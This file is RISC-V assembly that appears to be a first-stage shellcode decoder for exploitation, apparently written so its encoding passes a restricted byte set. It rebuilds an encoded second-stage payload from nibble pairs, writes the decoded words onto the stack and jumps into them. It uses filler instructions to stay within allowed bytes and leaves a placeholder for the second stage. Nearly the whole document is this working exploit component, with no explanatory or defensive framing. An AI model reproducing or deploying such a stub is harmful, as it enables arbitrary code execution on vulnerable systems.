
	.globl	_start
	
	.text
_start:
# get payload address into s0
	auipc	s0, 0x7e7e1
#	c.and	a5, a0
	lui	a6, 0x8181e
	add	s2, s0, a6
	sub	s0, s2, x0
        addi    s0, s0, 0x7f7
        addi    s0, s0, 0x7f7
#The 8-bit is not allowed in set of addi
#Current Total: 194 (196, test)
        addi    s0, s0, 66
	addi	s0, s0, 66
	addi	s0, s0, 64

# load 8 bytes of 0x0F into a7
	c.and 	a5, a0
	xor	a7, s6, s6
	c.li	a6, 0x0F
	c.add	a7, a6

	c.mv	t6, s8
	c.slli	a7, 8
	c.add	a7, a6

	xor 	a6, s6, s6
	or	a6, a6, a7
	c.mv	t6, s8
	c.slli	a7, 8
	c.mv	t6, s8
	c.slli	a7, 8
	c.add	a7, a6

	xor	a6, s6, s6
	or	a6, a6, a7
	c.mv	t6, s8
	c.slli	a7, 8
	c.mv	t6, s8
	c.slli	a7, 8
	c.mv	t6, s8
	c.slli	a7, 8
	c.mv	t6, s8
	c.slli	a7, 8
	c.add 	a7, a6

# get count into a4
	c.ld	a4, 0(s0)
	c.ld	a2, 8(s0)
	c.addi	s0, 16
	and	a4, a4, a7
	and	a2, a2, a7
	c.slli	a2, 4
	lui	a6, 0xe4484
	c.mv	a3, a2
	lui	a6, 0xe4484
	c.mv	a5, a4
	lui	a6, 0xe4484
	c.add	a3, a5

0:
# get word to write into a0
	c.ld	a0, 0(s0)
	c.ld	a2, 8(s0)
	c.addi	s0, 16

	and	a0, a0, a7
	and	a2, a2, a7
	c.slli	a2, 4

#add a0, a2 into a1
	lui	a6, 0xe4484
	c.mv	s3, a0
	lui	a6, 0xe4484
	c.mv	a5, a2
	lui	a6, 0xe4484
	c.add	s3, a5

# store a0 on the stack
	c.addi	sp, -16
	c.sdsp	s3, 8(sp)
	c.sub	s1, a5
	c.addi	sp, 8
# loop
	c.addi	a3, -1
	c.bnez	a3, 0b
## jump to stage 2
	c.jr	sp
	.data
payload:
# SECOND STAGE SUBSTITUTED HERE
